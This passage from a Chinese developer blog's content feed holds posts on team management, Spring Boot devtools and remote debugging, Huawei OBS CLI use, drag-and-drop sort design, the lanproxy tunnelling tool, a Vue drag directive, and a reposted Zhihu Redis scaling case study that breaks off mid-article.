的时候被分配到国内某项目，负责前端开发，构建一个报表页面。我们组就两个人，一个前端，也就是我，还有一个后端。</p><p>项目比较简单，我很快构建好了 React 的前端页面，因此在 Interview ++ 中的评价还行。后端那个兄弟使用 Spring boot 构建 API ，并需要连接 LDAP 获取公司的员工信息。他的工作并不顺利，花了大概两周才完成了 API 构建而且质量不佳。</p><p>后来我参加他的 Interview ++，得知他有10年以上的工作经验，之前一直都是写 C++ ，因为没有合适的项目来这个项目上写 Java。他的 Interview ++ 评价很不好，“技术能力一般，和工作经验不匹配” “不主动交流” “接受反馈的能力不好” 等。</p><p>因为项目上只有两个人，我们私下关系比较好，他虽然不是很健谈的人，但是具有非常好的沟通能力，理性和独立思考。我能理解他被给负面反馈的原因，无非是他工作在一个不适合他的位置，当技术能力无法满足项目需要时。在团队眼里，优点就会被弱化，缺点被放大。</p><p>很多人可能会说，写得好 C++ 的人写 Java 也会很快上手。但是客观事实是，计算机语言虽然很容易跨越，但是领域很难。长期重试嵌入式工作的人在没有人知道的情况下，在两周内上手 Spring boot 这种 “低级“ 技术很困难，因为需要很多服务器编程的背景知识。</p><p>在某个平行宇宙，他会不会上了一个他擅长的项目，被当做大神膜拜。“不主动交流” “接受反馈的能力不好”  这些反馈还算不算缺点呢？</p><p><strong>优秀的管理者，应是引水人，把员工放到合适的地方，用合适的期望评价工作产出。需要遵从科学发展观，再好的水也不能逆势倒流</strong>。</p><h3 id="一个客户的故事"><a href="#一个客户的故事" class="headerlink" title="一个客户的故事"></a>一个客户的故事</h3><p>”我说过好多次了，提交代码前需要本地跑通，现在流水线又挂了“</p><p>”我昨天就强调，没用的代码要删除，不要留在项目里面“</p><p>”你这个代码能不能写的规范一点，这么乱“</p><p>晨会开了半个小时后，我无奈的放下耳机。在国内的一个项目上，我被派到一个团队和客户一起工作，这几乎是每天早上的状态。每天主持晨会的人是客户一个工作了很久的人，他似乎很恼怒，责备负责管理供应商的人为什么招聘了这么多能力差的人。</p><p>我入场后，分配的第一个个工作是改造一个旧项目，这个项目因为某些设计遗留问题，遇到了性能瓶颈，需要优化。一个负责相关业务的人来给我讲了一下背景，然后给我开通了一个代码仓库的权限，我就这么开始工作了。</p><p>当我开始下载好代码后，头皮发麻，这个项目没有任何文档介绍如何启动。甚至我不知道这个项目在整个系统中处于哪个位置，我开始四处求助。我找遍了整个办公室的人，得到了很多收获。</p><ul><li><p>想要把项目跑起来，本地需要安装 Redis、数据库等依赖，不过需要从同事那里先拷贝一些特别的配置，并注释几行代码。</p></li><li><p>想要了解整个项目的背景，找了同事 A、B、C 终于拼凑出了这个项目的概况。</p></li><li><p>项目没有任何规范，全凭自己发挥，至少有三种加解密的工具类，多种序列化方法。</p></li><li>想要部署到 Dev 环境，发现每个人建有自己的流水线，部署方式各不相同。</li></ul><p>最终这个项目做的非常头疼，技术经理没有打通整个工作流，整理相关的文档、规范、部署方法，让开发把主要力气用在开发上。每个人都需要摸索一套自己的做事方法，做东西很难说高效和”规范“ 。</p><p><strong>优秀的管理者，应是治水人，像都江堰的鱼嘴、堤堰，疏、堵相适宜。设计流、协作体系，制定规范。</strong></p><p>一线工作者和领导有一些不同点，也有相同点。</p><p>不同点是一线工作者的诉求和领导的诉求不同。一线工作者的诉求主要有两个，干的开不开心，还有钱够不够。领导的诉求是，能不能出活儿，是不是能服从安排。</p><p>相同点是，他们都不希望对方老是来事儿。</p><p>一个软件项目是否成功，不仅取决于工程师和技术挑战之间的矛盾，还有团队协作的流畅性和项目经理的管理手段之间的矛盾。</p><p>治大国如烹小鲜，被管理者也不喜欢被天天折腾。</p>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 单元测试一本通</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-test-in-all/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/java-test-in-all/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="为什么要写单元测试"><a href="#为什么要写单元测试" class="headerlink" title="为什么要写单元测试?"></a>为什么要写单元测试?</h2><h2 id="Junit-入门"><a href="#Junit-入门" class="headerlink" title="Junit 入门"></a>Junit 入门</h2><h3 id="认识-junit4"><a href="#认识-junit4" class="headerlink" title="认识 junit4"></a>认识 junit4</h3><h3 id="given-when-then"><a href="#given-when-then" class="headerlink" title="given when then"></a>given when then</h3><h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><h3 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h3><h2 id="和-Spring-一起使用"><a href="#和-Spring-一起使用" class="headerlink" title="和 Spring 一起使用"></a>和 Spring 一起使用</h2><h2 id="和-Spring-boot-一起使用"><a href="#和-Spring-boot-一起使用" class="headerlink" title="和 Spring boot 一起使用"></a>和 Spring boot 一起使用</h2><h2 id="使用-mockito"><a href="#使用-mockito" class="headerlink" title="使用 mockito"></a>使用 mockito</h2><h3 id="mock"><a href="#mock" class="headerlink" title="mock"></a>mock</h3><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><h3 id="spy"><a href="#spy" class="headerlink" title="spy"></a>spy</h3><h2 id="PowerMock"><a href="#PowerMock" class="headerlink" title="PowerMock"></a>PowerMock</h2><h2 id="使用-H2-测试数据库"><a href="#使用-H2-测试数据库" class="headerlink" title="使用 H2 测试数据库"></a>使用 H2 测试数据库</h2><h2 id="分层测试"><a href="#分层测试" class="headerlink" title="分层测试"></a>分层测试</h2><h3 id="使用-DDD-的分层架构"><a href="#使用-DDD-的分层架构" class="headerlink" title="使用 DDD 的分层架构"></a>使用 DDD 的分层架构</h3><h3 id="测试领域层"><a href="#测试领域层" class="headerlink" title="测试领域层"></a>测试领域层</h3><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><h3 id="测试金字塔"><a href="#测试金字塔" class="headerlink" title="测试金字塔"></a>测试金字塔</h3><h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><h3 id="边界划分"><a href="#边界划分" class="headerlink" title="边界划分"></a>边界划分</h3><h3 id="测试语义化"><a href="#测试语义化" class="headerlink" title="测试语义化"></a>测试语义化</h3><h3 id="统计测试覆盖率"><a href="#统计测试覆盖率" class="headerlink" title="统计测试覆盖率"></a>统计测试覆盖率</h3><h3 id="加入-CI"><a href="#加入-CI" class="headerlink" title="加入 CI"></a>加入 CI</h3>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 本地开发工具</title>
      <link href="/Spring/spring/spring-boot-dev-tools/"/>
      <url>/Spring/spring/spring-boot-dev-tools/</url>
      
        <content type="html"><![CDATA[<h2 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a>Developer Tools</h2><p>Spring Boot包含一组额外的工具，这些工具可以使应用程序开发体验更加愉快。 spring-boot-devtools模块可以包含在任何项目中，以提供其他开发时功能。</p><pre><code>&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;        &lt;optional&gt;true&lt;/optional&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>运行完全打包的应用程序时，将自动禁用开发人员工具。用 java -jar 运行，开发工具就不起作用了，可以手动开启 -Dspring.devtools.restart.enabled=false</li><li>dev tool 会修改默认配置，例如禁用缓存、打印日志<ul><li>spring.devtools.add-properties 关闭 dev tool 的额外配置</li><li>spring.mvc.log-request-details 开启请求日志，方便开发</li></ul></li><li>自动重启的原理是监听 classpath 的变化，像模板、配置之类的东西会自动触发重启，但是如果是源代码修改，需要手动进行构建然后触发 重启，也可以开启 IDE 的自动编译</li><li>监控除了 classpath 之外的目录 spring.devtools.restart.additional-paths</li><li>dev tool 也支持模板等资源文件的 livereload，需要去下载 livereload 插件</li><li>dev tool 可以单独配置在文件 spring-boot-devtools.properties 或者 spring-boot-devtools.yml，实现对各个项目的配置，配置文件需要放到 ~/.config/spring-boot/ 目录下面。不过这个目录下和 profile 无关。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 项目远程 debug</title>
      <link href="/Spring/spring/spring-boot-remote-debug/"/>
      <url>/Spring/spring/spring-boot-remote-debug/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-boot-项目远程-debug"><a href="#Spring-boot-项目远程-debug" class="headerlink" title="Spring boot 项目远程 debug"></a>Spring boot 项目远程 debug</h2><p>可以在启用了远程调试支持的情况下运行打包的应用程序。这样做可以将调试器附加到打包的应用程序，如以下示例所示：</p><blockquote><p>java -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=8000,suspend=n \<br>       -jar target/myapplication-0.0.1-SNAPSHOT.jar</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.3.0.RELEASE/reference/htmlsingle/#boot-documentation-about" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/2.3.0.RELEASE/reference/htmlsingle/#boot-documentation-about</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>华为云使用笔记</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/huaweicloud/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/huaweicloud/</url>
      
        <content type="html"><![CDATA[<h2 id="OBS-cli"><a href="#OBS-cli" class="headerlink" title="OBS cli"></a>OBS cli</h2><p>配置密匙</p><blockquote><p>./obsutil config -i=ak -k=sk -e=endpoint</p></blockquote><p>操作文件</p><blockquote><p>./obsutil cp /tmp/test.jpg  obs://avatar-dev/custom.jpg -f</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://support.huaweicloud.com/utiltg-obs/obs_11_0005.html" target="_blank" rel="noopener">https://support.huaweicloud.com/utiltg-obs/obs_11_0005.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>拖拽排序后端设计方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/sort-in-db/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/sort-in-db/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近有一个需求，用户需要管理部门下所有的成员。根据显示的成员列表显示拖拽排序，成员的数量比较多，需要分页显示，高达数千条。</p><p><img src="/技术方案/solution/sort-in-db/20190604153235130.gif" alt="img"></p><h2 id="全量更新重拍"><a href="#全量更新重拍" class="headerlink" title="全量更新重拍"></a>全量更新重拍</h2><p>当用户量较少时，前端全量更新给后端顺序，例如 post 接口，将 ID 的数组发送到后端。</p><pre><code>[2,3,4,2] </code></pre><p>适合首页轮播图管理、任务卡片管理。</p><h2 id="中值法"><a href="#中值法" class="headerlink" title="中值法"></a>中值法</h2><p>原理与实现步骤：</p><ol><li>每条记录有一个记录顺序的字段，例如 <code>index</code> ，添加记录时按照一定的步长添加。例如 1000 2000 ，这个间隔就是用来实现排序，并最小程度不更新数据库。</li><li>当拖拽改变元素位置时，更新 <code>index</code>。更新规则如下：<ol><li>调整一个元素到两个元素中间时，<code>(pre_item.index + after_item.index）/ 2 =</code>index </li><li>调整一个元素到第一个元素时， <code>old_first_item.index / 2 = index</code></li><li>调整一个元素到最后一个元素时， <code>old_last_item.index + 65536 = index</code></li></ol></li><li>当前后两个元素的数值，不满足整数时，更新所有元素的排序。也就是排序空间不够，触发重排。</li></ol><p>注意事项：</p><ul><li>合理设置步长，理想情况，不触发重排最大排序次数是，步长对于2的对数。</li><li>触发重排需要设置分布式锁</li></ul><h2 id="平移法"><a href="#平移法" class="headerlink" title="平移法"></a>平移法</h2><p>每个元素，都有一个字段<code>index</code>，表示元素的排序信息。<br> 规定元素从0开始递增。</p><p> 基本操作如下：</p><ul><li>增加数据。 新增元素时，序号为当前元素数据总量值。</li><li>删除元素。删除元素时，将大于该元素的序号，都减1，后续元素前移。</li><li>修改元素排序。当元素从 x 移动到 y 时，<ul><li>若 x &lt; y 时，则将(x, y)范围内的元素都减1，前移</li><li>若 x &gt; y 时，则将(y, x)范围内的元素都加1，后移</li></ul></li><li>查询元素。展示列表时，按照 <code>index</code> 字段进行排序即可。若需要查第n位元素时，元素位置为 <code>index = n - 1</code>。</li></ul><p>这种方式优点是，查询快，修改慢。而且，修改接口的逻辑较重，处理起来比较麻烦。适合频繁操作，但是对接口性能要求不高的场景。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.jianshu.com/p/9ee708e43ebf" target="_blank" rel="noopener">https://www.jianshu.com/p/9ee708e43ebf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【转载】内网穿透组件 lanproxy</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/lanproxy/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/lanproxy/</url>
      
        <content type="html"><![CDATA[<p><strong>前言碎语</strong></p><p><strong>lanproxy是什么？</strong></p><p>lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，，在github上面已经开源，目前已经收到2000多star。目前支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面…）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。</p><p>github坐标 : <a href="https://github.com/ffay/lanproxy" target="_blank" rel="noopener">https://github.com/ffay/lanproxy</a></p><p><strong>lanproxy原理？</strong></p><p>lanproxy是基于java通讯框架netty开发的，由服务端和客户端组成，服务端启动后，客户端会去连接服务端，然后和服务端建立tcp连接通道。服务端负责接收外部流量，然后根据配置的端口映射规则转发给客户端监听的端口服务（本地内网），从而达到内网穿透的目的。</p><p><strong>lanproxy下载地址？</strong></p><p>服务端：<a href="https://seafiled.io2c.com/files/98d54489-2dfc-46bb-b37b-e693468c2542/lanproxy-server-20171116.zip" target="_blank" rel="noopener">proxy-server.zip</a></p><p>java客户端：<a href="https://seafiled.io2c.com/files/b47ca9c0-2639-4e32-a069-7af5054bf2e9/lanproxy-java-client-20171116.zip" target="_blank" rel="noopener">proxy-client.zip</a>，更多客户端类型，可访问：<a href="https://seafile.io2c.com/d/3b1b44fee5f74992bb17/?p=/lanproxy-client&amp;mode=list" target="_blank" rel="noopener">https://seafile.io2c.com/d/3b1b44fee5f74992bb17</a></p><p><strong>启动server端</strong></p><p>准备一台安装jdk的服务器（支持linux、Windows），需要有外网地址。下载server下来后，解压proxy-server.zip，进入到bin目录，执行startup.sh脚本就启动了，默认的访问端口是8090.用户名和密码是admin/admin。可以通过conf/config.properties修改。</p><p>访问<a href="http://ip:8090,就可以看到如下页面了" target="_blank" rel="noopener">http://ip:8090,就可以看到如下页面了</a></p><p><img src="/技术组件/tech-components/lanproxy/20180911200313_33938.png" alt="img"></p><p>服务端启动后，需要添加客户端信息，客户端主要生成一个client.key，用来做连接的认证信息的。然后如下图，选择 一个客户端添加端口映射。</p><p><img src="/技术组件/tech-components/lanproxy/20180911200848_59946.png" alt="img"></p><p><strong>客户端链接</strong></p><p>客户端下载下来后，先解压，目录结构和服务端一样，先去conf/config.properties中把server.host修改为你的服务端ip，服务端端口默认4900不用变。然后把第一步客户端生成的客户端密码配置给client.key。然后启动bin/startup.bat就可以了。如果连接服务器成功，管理控制台就会显示在线。然后就可以使用serverip:xxx来访问你的内网服务了</p>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue 中拖拽的方法</title>
      <link href="/Javascript/javascript/vue-drag/"/>
      <url>/Javascript/javascript/vue-drag/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">// (function () {  var vueDragDrag = {}  vueDragDrag.install = function (Vue) {    Vue.directive(&#39;drag&#39;, {      inserted: function (el, binding) {        // 如果拖动元素非元素本身（el），传入id        var moveEl = binding.value &amp;&amp; binding.value.moveElId ? document.getElementById(binding.value.moveElId) : el        // 为拖动元素添加绝对定位        moveEl.style.position = &#39;absolute&#39;        // 如果容器为设置position属性，默认为 position = &#39;relative&#39;        if (getComputedStyle(moveEl.parentNode, null).position === &#39;static&#39;) {          moveEl.parentNode.style.position = &#39;relative&#39;        }        var mouseDownFn = function (e) {          if(e.target != el) return false;          // 拖拽时的手势          // el.style.cursor = binding.value &amp;&amp; binding.value.cursor ? binding.value.cursor : &#39;move&#39;          //.shaow---------- 复制节点，并且插入容器中原来位置          if (binding.modifiers.shaow) {            var newNode = moveEl.cloneNode(true)            moveEl.style.opacity = &#39;0.5&#39;            moveEl.parentNode.appendChild(newNode)          }          var disX, disY          if (!binding.modifiers.dragY) disX = e.clientX - moveEl.offsetLeft          if (!binding.modifiers.dragX) disY = e.clientY - moveEl.offsetTop          var mouseMoveFn = function (e) {            e.preventDefault()            var left = e.clientX - disX            var top = e.clientY - disY            // 可以拖出去的元素的剩余宽度            // dragOutX            var limitWidth = binding.value &amp;&amp; binding.value.dragOutX ? moveEl.offsetWidth - binding.value.dragOutX : 0            // dragOutY            if (binding.value &amp;&amp; binding.value.dragOutY) {              var limitHeigth = moveEl.offsetHeight - binding.value.dragOutY              // 防止可拖拽区域被拖出容器区域              // 拖拽元素在顶部              var limitHeigthTop = el.offsetHeight - binding.value.dragOutY            } else {              var limitHeigth = 0              var limitHeigthTop = 0            }            if (left &lt; 0 - limitWidth) {              left = 0 - limitWidth            }            else if (left &gt; moveEl.parentNode.clientWidth - moveEl.offsetWidth + limitWidth) {              left = moveEl.parentNode.clientWidth - moveEl.offsetWidth + limitWidth            }            if (top &lt; 0 - limitHeigthTop) {              top = 0 - limitHeigthTop            }            else if (top &gt; moveEl.parentNode.clientHeight - moveEl.offsetHeight + limitHeigth) {              top = moveEl.parentNode.clientHeight - moveEl.offsetHeight + limitHeigth;            }            moveEl.style.left = left + &#39;px&#39;            moveEl.style.top = top + &#39;px&#39;            // 拖拽事件            if (binding.value &amp;&amp; binding.value.ondrag) {              if (typeof binding.value.ondrag != &#39;function&#39;) throw &#39;ondrag: should be a function&#39;              binding.value.ondrag(e, { left: left, top: top })            }          }          // mousemove          document.addEventListener(&#39;mousemove&#39;, mouseMoveFn)          var mouseUpFn = function () {            // 移除临时shaow节点            if (newNode) {              moveEl.style.opacity = &#39;1&#39;              newNode.parentNode.removeChild(newNode)            }            document.removeEventListener(&#39;mousemove&#39;, mouseMoveFn)            document.removeEventListener(&#39;mouseup&#39;, mouseUpFn)          }          //  mouseup          document.addEventListener(&#39;mouseup&#39;, mouseUpFn)        }        // mousedown        el.addEventListener(&#39;mousedown&#39;, mouseDownFn)      }    })  }  export default vueDragDrag</code></pre>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【转载】从单机到2000万QPS并发的Redis高性能缓存实践之路</title>
      <link href="/%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/case-study/zhihu-redis-cluster/"/>
      <url>/%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/case-study/zhihu-redis-cluster/</url>
      
        <content type="html"><![CDATA[<h2 id="1、引言"><a href="#1、引言" class="headerlink" title="1、引言"></a>1、引言</h2><p>知乎存储平台团队基于开源Redis 组件打造的知乎 Redis 平台，经过不断的研发迭代，目前已经形成了一整套完整自动化运维服务体系，提供很多强大的功能。本文作者陈鹏是该系统的负责人，本次文章深入介绍了该系统的方方面面，值得互联网后端程序员仔细研究。</p><p><img src="/案例学习/case-study/zhihu-redis-cluster/112115tbpgmohsebm2o3mh.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_v2-98aa01df20134d401607137eecb11d98_r-2.jpg"></p><h2 id="2、关于作者"><a href="#2、关于作者" class="headerlink" title="2、关于作者"></a>2、关于作者</h2><p><strong>陈鹏：</strong>现任知乎存储平台组 Redis 平台技术负责人，2014 年加入知乎技术平台组从事基础架构相关系统的开发与运维，从无到有建立了知乎 Redis 平台，承载了知乎高速增长的业务流量。</p><h2 id="3、技术背景"><a href="#3、技术背景" class="headerlink" title="3、技术背景"></a>3、技术背景</h2><p>知乎作为知名中文知识内容平台，每日处理的访问量巨大 ，如何更好的承载这样巨大的访问量，同时提供稳定低时延的服务保证，是知乎技术平台同学需要面对的一大挑战。</p><p>知乎存储平台团队基于开源 Redis 组件打造的 Redis 平台管理系统，经过不断的研发迭代，目前已经形成了一整套完整自动化运维服务体系，提供一键部署集群，一键自动扩缩容, Redis 超细粒度监控，旁路流量分析等辅助功能。</p><p><strong>目前，Redis 在知乎的应用规模如下：</strong></p><ul><li>1）机器内存总量约 70TB，实际使用内存约 40TB；</li><li>2）平均每秒处理约 1500 万次请求，峰值每秒约 2000 万次请求；</li><li>3）每天处理约 1 万亿余次请求；</li><li>4）单集群每秒处理最高每秒约 400 万次请求；</li><li>5）集群实例与单机实例总共约 800 个；</li><li>6）实际运行约 16000 个 Redis 实例；</li><li>7）Redis 使用官方 3.0.7 版本，少部分实例采用 4.0.11 版本。</li></ul><h2 id="4、知乎的Redis应用类型"><a href="#4、知乎的Redis应用类型" class="headerlink" title="4、知乎的Redis应用类型"></a>4、知乎的Redis应用类型</h2><p>根据业务的需求，我们将Redis实例区分为单机（Standalone）和集群（Cluster）两种类型，单机实例通常用于容量与性能要求不高的小型存储，而集群则用来应对对性能和容量要求较高的场景。</p><p>而在集群（Cluster）实例类型中，当实例需要的容量超过 20G 或要求的吞吐量超过 20万请求每秒时，我们会使用集群（Cluster）实例来承担流量。集群是通过中间件（客户端或中间代理等）将流量分散到多个 Redis 实例上的解决方案。知乎的 Redis 集群方案经历了两个阶段：客户端分片（2015年前使用的方案）与 Twemproxy 代理（2015年至今使用的方案）。</p><p>下面将分别来介绍这两个类型的Redis实例在知乎的应用实践情况。</p><h2 id="5、知乎的Redis实例应用类型1：单机（Standalone）"><a href="#5、知乎的Redis实例应用类型1：单机（Standalone）" class="headerlink" title="5、知乎的Redis实例应用类型1：单机（Standalone）"></a>5、知乎的Redis实例应用类型1：单机（Standalone）</h2><p>对于单机实例，我们采用原生主从（Master-Slave）模式实现高可用，常规模式下对外仅暴露 Master 节点。由于使用原生 Redis，所以单机实例支持所有 Redis 指令。</p><p>对于单机实例，我们使用 Redis 自带的哨兵（Sentinel）集群对实例进行状态监控与 Failover。Sentinel 是 Redis 自带的高可用组件，将 Redis 注册到由多个 Sentinel 组成的 Sentinel 集群后，Sentinel 会对 Redis 实例进行健康检查，当 Redis 发生故障后，Sentinel 会通过 Gossip 协议进行故障检测，确认宕机后会通过一个简化的 Raft 协议来提升 Slave 成为新的 Master。</p><p>通常情况我们仅使用 1 个 Slave 节点进行冷备，如果有读写分离请求，可以建立多个 Read only slave 来进行读写分离。</p><p><img src="/案例学习/case-study/zhihu-redis-cluster/112140o5xhaia5t56x40nk.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_2.jpg"></p><p>如上图所示，通过向 Sentinel 集群注册 Master 节点实现实例的高可用，当提交 Master 实例的连接信息后，Sentinel 会主动探测所有的 Slave 实例并建立连接，定期检查健康状态。客户端通过多种资源发现策略如简单的 DNS 发现 Master 节点，将来有计划迁移到如 Consul 或 etcd 等资源发现组件 。</p><p>当 Master 节点发生宕机时，Sentinel 集群会提升 Slave 节点为新的 Master，同时在自身的 pubsub channel +switch-master 广播切换的消息，具体消息格式为：</p><p>switch-master <master name=""> <oldip> <oldport> <newip> <newport></newport></newip></oldport></oldip></master></p><p>watcher 监听到消息后，会去主动更新资源发现策略，将客户端连接指向新的 Master 节点，完成 Failover，具体 Failover 切换过程详见 Redis 官方文档（<a href="https://redis.io/topics/sentinel" target="_blank" rel="noopener">Redis Sentinel Documentation - Redis</a>）。</p><p><strong>实际使用中需要注意以下几点：</strong></p><ul><li>1）只读 Slave 节点可以按照需求设置 slave-priority 参数为 0，防止故障切换时选择了只读节点而不是热备 Slave 节点；</li><li>2）Sentinel 进行故障切换后会执行 CONFIG REWRITE 命令将 SLAVEOF 配置落地，如果 Redis 配置中禁用了 CONFIG 命令，切换时会发生错误，可以通过修改 Sentinel 代码来替换 CONFIG 命令；</li><li>3）Sentinel Group 监控的节点不宜过多，实测超过 500 个切换过程偶尔会进入 TILT 模式，导致 Sentinel 工作不正常，推荐部署多个 Sentinel 集群并保证每个集群监控的实例数量小于 300 个；</li><li>4）Master 节点应与 Slave 节点跨机器部署，有能力的使用方可以跨机架部署，不推荐跨机房部署 Redis 主从实例；</li><li>5）Sentinel 切换功能主要依赖 down-after-milliseconds 和 failover-timeout 两个参数，down-after-milliseconds 决定了 Sentinel 判断 Redis 节点宕机的超时，知乎使用 30000 作为阈值。而 failover-timeout 则决定了两次切换之间的最短等待时间，如果对于切换成功率要求较高，可以适当缩短 failover-timeout 到秒级保证切换成功，具体详见 Redis 官方文档；</li><li>6）单机网络故障等同于机器宕机，但如果机房全网发生大规模故障会造成主从多次切换，此时资源发现服务可能更新不够及时，需要人工介入。</li></ul><h2 id="6、知乎的Redis实例应用类型2：集群之客户端分片方案（2015以前使用）"><a href="#6、知乎的Redis实例应用类型2：集群之客户端分片方案（2015以前使用）" class="headerlink" title="6、知乎的Redis实例应用类型2：集群之客户端分片方案（2015以前使用）"></a>6、知乎的Redis实例应用类型2：集群之客户端分片方案（2015以前使用）</h2><p>早期知乎使用 redis-shard 进行客户端分片，redis-shard 库内部实现了 CRC32、MD5、SHA1 三种哈希算法 ，支持绝大部分 Redis 命令。使用者只需把 redis-shard 当成原生客户端使用即可，无需关注底层分片。</p><p><img src="/案例学习/case-study/zhihu-redis-cluster/112703a3f8gmiizmqi80dt.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_3.jpg"></p><p><strong>基于客户端的分片模式具有如下优点：</strong></p><ul><li>1）基于客户端分片的方案是集群方案中最快的，没有中间件，仅需要客户端进行一次哈希计算，不需要经过代理，没有官方集群方案的 MOVED/ASK 转向；</li><li>2）不需要多余的 Proxy 机器，不用考虑 Proxy 部署与维护；</li><li>3）可以自定义更适合生产环境的哈希算法。</li></ul><p><strong>但是也存在如下问题：</strong></p><ul><li>1）需要每种语言都实现一遍客户端逻辑，早期知乎全站使用 Python 进行开发，但是后来业务线增多，使用的语言增加至 Python，Golang，Lua，C/C++，JVM 系（Java，Scala，Kotlin）等，维护成本过高；</li><li>2）无法正常使用 MSET、MGET 等多种同时操作多个 Key 的命令，需要使用 Hash tag 来保证多个 Key 在同一个分片上；</li><li>3）升级麻烦，升级客户端需要所有业务升级更新重启，业务规模变大后无法推动；</li><li>4）扩容困难，存储需要停机使用脚本 Scan 所有的 Key 进行迁移，缓存只能通过传统的翻倍取模方式进行扩容；</li><li>5）由于每个客户端都要与所有的分片建立池化连接，客户端基数过大时会造成 Redis 端连接数过多，Redis 分片过多时会造成 Python 客户端负载升高。</li></ul><p>具体特点详见：<a href="https://github.com/zhihu/redis-shard" target="_blank" rel="noopener">https://github.com/zhihu/redis-shard</a></p><p>早期知乎大部分业务由 Python 构建，Redis 使用的容量波动较小， redis-shard 很好地应对了这个时期的业务需求，在当时是一个较为不错解决方案。</p><h2 id="7、知乎的Redis实例应用类型2：集群之Twemproxy-集群方案（2015之今在用）"><a href="#7、知乎的Redis实例应用类型2：集群之Twemproxy-集群方案（2015之今在用）" class="headerlink" title="7、知乎的Redis实例应用类型2：集群之Twemproxy 集群方案（2015之今在用）"></a>7、知乎的Redis实例应用类型2：集群之Twemproxy 集群方案（2015之今在用）</h2><p>2015 年开始，业务上涨迅猛，Redis 需求暴增，原有的 redis-shard 模式已经无法满足日益增长的扩容需求，我们开始调研多种集群方案，最终选择了简单高效的 Twemproxy 作为我们的集群方案。</p><p><strong>由 Twitter 开源的 Twemproxy 具有如下优点：</strong></p><ul><li>1）性能很好且足够稳定，自建内存池实现 Buffer 复用，代码质量很高；</li><li>2）支持 fnv1a_64、murmur、md5 等多种哈希算法；</li><li>3）支持一致性哈希（ketama），取模哈希（modula）和随机（random）三种分布式算法。</li></ul><p>具体特点详见：<a href="https://github.com/twitter/twemproxy" target="_blank" rel="noopener">https://github.com/twitter/twemproxy</a></p><p><strong>但是缺点也很明显：</strong></p><ul><li>1）单核模型造成性能瓶颈；</li><li>2）传统扩容模式仅支持停机扩容。</li></ul><p>对此，我们将集群实例分成两种模式，即缓存（Cache）和存储（Storage）：</p><p>如果使用方可以接收通过损失一部分少量数据来保证可用性，或使用方可以从其余存储恢复实例中的数据，这种实例即为缓存，其余情况均为存储。</p><p>我们对缓存和存储采用了不同的策略，请继续往下读。</p><h3 id="7-1存储"><a href="#7-1存储" class="headerlink" title="7.1存储"></a>7.1存储</h3><p><img src="/案例学习/case-study/zhihu-redis-cluster/114018nggotarwm3qa9kbk.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_4.jpg"></p><p>对于存储我们使用 